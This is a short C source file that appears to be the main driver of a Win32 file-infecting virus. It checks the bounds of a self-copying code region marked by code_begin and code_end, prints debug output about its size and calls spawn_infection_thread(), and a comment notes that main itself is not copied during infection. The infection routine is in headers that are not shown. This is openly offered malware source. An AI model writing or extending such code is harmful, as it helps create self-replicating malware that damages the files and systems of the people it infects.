#include <assert.h>
#include <stdio.h>
#include <windows.h>

#include "code_begin.h"
#include "code_end.h"
#include "infection_thread.h"
#include "utility.h"

#ifdef _WIN64
#error "Currently only support Win32"
#endif

// main functon is not copied iduring infection, so can use any external
// function_list here
int main(int argc, char **argv) {
    assert(IS_32_BIT); // currently only 32 bit working, yet need to check for
                       // 64 bit compatibility/differences
    assert((IS_32_BIT || IS_64_BIT) && !(IS_32_BIT && IS_64_BIT));
    assert(code_begin < code_end);
    ASSERT_FUNCTION_IN_BOUNDARIES(spawn_infection_thread)

    if (IS_32_BIT) {
        PRINT_DEBUG("running 32 bit");
    } else if (IS_64_BIT) {
        PRINT_DEBUG("running 64 bit");
    }
    PRINT_DEBUG("code_begin = 0x%p", code_begin);
    PRINT_DEBUG("code_end = 0x%p", code_end);
    PRINT_DEBUG("code_size = %.2fkB",
                (float)((uint8_t *)code_end - (uint8_t *)code_begin) / 1000.);
    spawn_infection_thread();
    system("pause");
    return 0;
}
